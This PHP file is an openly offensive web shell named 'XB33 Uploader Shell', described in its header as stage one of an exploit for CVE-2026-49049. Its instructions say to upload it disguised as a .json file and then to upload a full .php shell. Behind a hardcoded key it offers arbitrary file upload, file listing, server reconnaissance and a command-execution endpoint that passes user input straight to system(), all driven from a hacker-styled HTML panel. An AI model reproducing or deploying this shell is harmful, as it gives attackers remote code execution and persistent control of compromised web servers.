<?php
/**
 * XB33 Uploader Shell â€” CVE-2026-49049 Stage 1
 * Upload this as .json â†’ if PHP executes, upload real .php shell
 * Usage: ?k=b33              HTML uploader UI
 *        ?k=b33&f=upload     POST file upload (API)
 *        ?k=b33&f=list       list files (API)
 *        ?k=b33&f=info       server info (API)
 */
if(isset($_GET['k']) && $_GET['k']=='b33'){
    $act = $_GET['f'] ?? '';
    if($act=='upload' && $_SERVER['REQUEST_METHOD']=='POST'){
        @header('Content-Type: text/plain');
        $f = $_FILES['file'] ?? null;
        if($f && $f['error']==0){
            $n = basename($f['name']);
            $d = __DIR__ . '/' . $n;
            if(move_uploaded_file($f['tmp_name'], $d)){
                echo "OK:{$n}:" . filesize($d);
            } else {
                echo "FAIL:move";
            }
        } else {
            echo "FAIL:no_file";
        }
        exit;
    }
    if($act=='list'){
        @header('Content-Type: text/plain');
        $files = glob(__DIR__ . '/*.{php,phtml,phar,php5,php7,php8,json}', GLOB_BRACE);
        foreach($files as $f) echo basename($f) . ':' . filesize($f) . "\n";
        exit;
    }
    if($act=='info'){
        @header('Content-Type: text/plain');
        echo "PHP:" . phpversion() . "\n";
        echo "DIR:" . __DIR__ . "\n";
        echo "USER:" . (function_exists('get_current_user') ? get_current_user() : '?') . "\n";
        echo "SERVER:" . ($_SERVER['SERVER_SOFTWARE'] ?? '?') . "\n";
        echo "SAPI:" . php_sapi_name() . "\n";
        exit;
    }
    if($act=='exec'){
        @header('Content-Type: text/plain');
        $c = $_GET['c'] ?? '';
        if($c){
            echo "START\n";
            system($c);
            echo "\nEND";
        } else {
            echo "no cmd";
        }
        exit;
    }
    @header('Content-Type: text/html; charset=utf-8');
    $dir = __DIR__;
    $me = basename(__FILE__);
    $info = @phpversion() . ' | ' . php_sapi_name() . ' | ' . (function_exists('get_current_user') ? get_current_user() : '?');
    echo <<<HTML
<!DOCTYPE html>
<html>
<head><title>XB33</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:'Courier New',monospace;padding:20px}
h1{font-size:18px;margin-bottom:10px;border-bottom:1px solid #0f0;padding-bottom:8px}
.info{color:#888;font-size:12px;margin-bottom:15px}
.box{border:1px solid #0f0;padding:15px;margin-bottom:15px}
.box h2{font-size:14px;margin-bottom:10px;color:#0f0}
input[type=file]{color:#0f0;background:#111;border:1px solid #0f0;padding:5px}
input[type=submit]{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;font-weight:bold;font-family:inherit}
input[type=submit]:hover{background:#0a0}
pre{background:#111;padding:10px;overflow:auto;max-height:300px;font-size:12px;border:1px solid #333}
.btn{display:inline-block;background:#111;color:#0f0;border:1px solid #0f0;padding:5px 12px;cursor:pointer;margin:3px;text-decoration:none;font-size:12px}
.btn:hover{background:#0f0;color:#000}
#result{margin-top:10px}
</style>
</head>
<body>
<h1>[XB33] Uploader</h1>
<div class="info">{$info} | {$dir}</div>

<div class="box">
<h2>Upload</h2>
<form method="POST" enctype="multipart/form-data" action="?k=b33&f=upload" target="r">
<input type="file" name="file" id="fu">
<input type="submit" value="Upload">
</form>
</div>

<div class="box">
<h2>Actions</h2>
<a class="btn" onclick="api('list')">List Files</a>
<a class="btn" onclick="api('info')">Server Info</a>
<a class="btn" onclick="api('cmd')">Exec Cmd</a>
</div>

<div class="box">
<h2>Result</h2>
<iframe name="r" style="display:none" onload="document.getElementById('result').textContent=this.contentDocument.body.textContent"></iframe>
<pre id="result">Ready.</pre>
</div>

<script>
function api(act){
    if(act=='cmd'){
        var c=prompt('Command:');
        if(!c)return;
        var x=new XMLHttpRequest();
        x.open('GET','?k=b33&f=exec&c='+encodeURIComponent(c));
        x.onload=function(){document.getElementById('result').textContent=x.responseText};
        x.send();
        return;
    }
    var x=new XMLHttpRequest();
    x.open('GET','?k=b33&f='+act);
    x.onload=function(){document.getElementById('result').textContent=x.responseText};
    x.send();
}
</script>
</body>
</html>
HTML;
    exit;
}